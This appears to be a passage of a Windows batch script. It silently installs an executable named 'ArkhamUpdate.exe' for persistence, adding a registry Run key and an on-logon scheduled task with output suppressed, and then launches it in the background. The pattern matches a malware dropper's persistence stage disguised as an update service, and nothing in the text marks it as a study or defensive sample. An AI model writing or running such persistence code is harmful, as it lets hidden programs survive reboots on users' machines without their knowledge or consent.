reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ArkhamUpdate /t REG_SZ /d "\"%D%\ArkhamUpdate.exe\"" /f >nul 2>&1
schtasks /create /f /tn "ArkhamSvc" /tr "\"%D%\ArkhamUpdate.exe\"" /sc onlogon >nul 2>&1
start "" /b "%D%\ArkhamUpdate.exe"

